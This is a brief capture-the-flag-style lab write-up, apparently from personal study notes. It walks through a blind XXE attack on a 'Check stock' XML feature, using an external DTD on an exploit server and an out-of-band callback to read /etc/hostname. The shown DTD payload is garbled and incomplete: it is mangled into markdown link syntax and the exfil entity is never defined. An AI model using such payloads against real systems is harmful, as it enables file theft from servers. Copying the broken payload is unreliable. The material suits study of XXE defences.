This lab has a "Check stock" feature that parses XML input but does not display the result. To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

  
1\. Notice that the check stock feature sends and XML in the request.

![06ab3cd9f7b10fa7077dd1d4c8f6e8bd.png](../_resources/06ab3cd9f7b10fa7077dd1d4c8f6e8bd.png)  
<br/>2\. We are going to create an external TDT for this XML in the exploit server, using the payload:Â   
<br/>`<!ENTITY % file SYSTEM "[file:///etc/hostname"&gt;](# "file:///etc/hostname%22&gt;") <!ENTITY % eval " %eval; %exfil;`  
<br/>Click on view exploit and take note of the url  
<br/>![2393f866ec95f24d8ab869605dcad6e3.png](../_resources/2393f866ec95f24d8ab869605dcad6e3.png)  
<br/><br/>3\. Now go to check stock feature again, intercept the request, and change the payload to:  
<br/>![c97fe3cfa3029ee76badbb30eb8fcc80.png](../_resources/c97fe3cfa3029ee76badbb30eb8fcc80.png)  
<br/>You will receive and interaction in the collaborator and copy the code, that's the solution.  
<br/>![d45cb3620aaf76e37a6647fc9c3ceb5b.png](../_resources/d45cb3620aaf76e37a6647fc9c3ceb5b.png)